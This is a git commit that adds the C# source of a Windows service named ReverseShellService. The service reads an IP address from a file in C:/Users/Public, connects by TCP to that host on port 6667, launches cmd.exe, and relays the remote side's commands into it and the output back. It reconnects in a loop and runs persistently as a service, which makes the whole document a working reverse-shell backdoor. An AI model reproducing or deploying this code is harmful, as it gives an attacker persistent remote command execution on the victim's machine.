579af5ca85c99cbdc332219a45fc6fef26c29b94
suchmememanyskill <suchmememanyskill@users.noreply.github.com>
2021-10-05 17:47:15 +0200

    Add RSService

---
+++ RSService/ReverseShellService/RSService.cs
@@ -0,0 +1,90 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
+using System.Threading;
+using System.IO;
+
+namespace ReverseShellService
+{
+    public partial class RSService : ServiceBase
+    {
+        public enum ServiceState
+        {
+            SERVICE_STOPPED = 0x00000001,
+            SERVICE_START_PENDING = 0x00000002,
+            SERVICE_STOP_PENDING = 0x00000003,
+            SERVICE_RUNNING = 0x00000004,
+            SERVICE_CONTINUE_PENDING = 0x00000005,
+            SERVICE_PAUSE_PENDING = 0x00000006,
+            SERVICE_PAUSED = 0x00000007,
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct ServiceStatus
+        {
+            public int dwServiceType;
+            public ServiceState dwCurrentState;
+            public int dwControlsAccepted;
+            public int dwWin32ExitCode;
+            public int dwServiceSpecificExitCode;
+            public int dwCheckPoint;
+            public int dwWaitHint;
+        };
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);
+
+        public RSService()
+        {
+            InitializeComponent();
+        }
+
+        private static Thread thread;
+        private static string ipAddress;
+
+        private void SetServiceStatus(ServiceState state)
+        {
+            ServiceStatus serviceStatus = new ServiceStatus();
+            serviceStatus.dwCurrentState = state;
+            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            if (!File.Exists("C:/Users/Public/RSS/RSS"))
+            {
+                SetServiceStatus(ServiceState.SERVICE_STOPPED);
+                //return;
+                Environment.Exit(1);
+            }
+
+            ipAddress = File.ReadAllText("C:/Users/Public/RSS/RSS");
+
+            thread = new Thread(ThreadWorker);
+            thread.Start();
+
+            SetServiceStatus(ServiceState.SERVICE_RUNNING);
+        }
+
+        protected override void OnStop()
+        {
+            RemoteShell.CloseConnection = true;
+
+            thread.Join();
+
+            SetServiceStatus(ServiceState.SERVICE_STOPPED);
+        }
+
+        public void ThreadWorker()
+        {
+            RemoteShell.RunShell(ipAddress, 6667);
+        }
+    }
+}
---
+++ RSService/ReverseShellService/RemoteShell.cs
@@ -0,0 +1,91 @@
+﻿using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+
+namespace ReverseShellService
+{
+    public class RemoteShell
+    {
+        static StreamWriter streamWriter;
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        public static bool CloseConnection = false;
+
+        public static void RunShell(string ip, int port)
+        {
+            //var handle = GetConsoleWindow();
+            //ShowWindow(handle, 0);
+            while (!CloseConnection)
+            {
+                try
+                {
+                    using (TcpClient client = new TcpClient(ip, port))
+                    {
+                        using (Stream stream = client.GetStream())
+                        {
+                            using (StreamReader rdr = new StreamReader(stream))
+                            {
+                                streamWriter = new StreamWriter(stream);
+
+                                StringBuilder strInput = new StringBuilder();
+                                
+                                Process p = new Process();
+                                p.StartInfo.FileName = "cmd.exe";
+                                
+                                //p.StartInfo.CreateNoWindow = true;
+                                
+                                p.StartInfo.UseShellExecute = false;
+                                p.StartInfo.RedirectStandardOutput = true;
+                                p.StartInfo.RedirectStandardInput = true;
+                                p.StartInfo.RedirectStandardError = true;
+                                p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                                p.Start();
+                                p.BeginOutputReadLine();
+                                
+                                while (!CloseConnection && !p.HasExited)
+                                {
+                                    strInput.Append(rdr.ReadLine());
+                                    //strInput.Append("\n");
+                                    p.StandardInput.WriteLine(strInput);
+                                    strInput.Remove(0, strInput.Length);
+                                }
+                            }
+                        }
+                    }
+                }
+                catch (SocketException e)
+                {
+                    Console.WriteLine("Shit didn't connect yo");
+                }
+                catch (IOException e)
+                {
+                    Console.WriteLine("Shit ended yo");
+                }
+            }
+        }
+
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+    }
+}
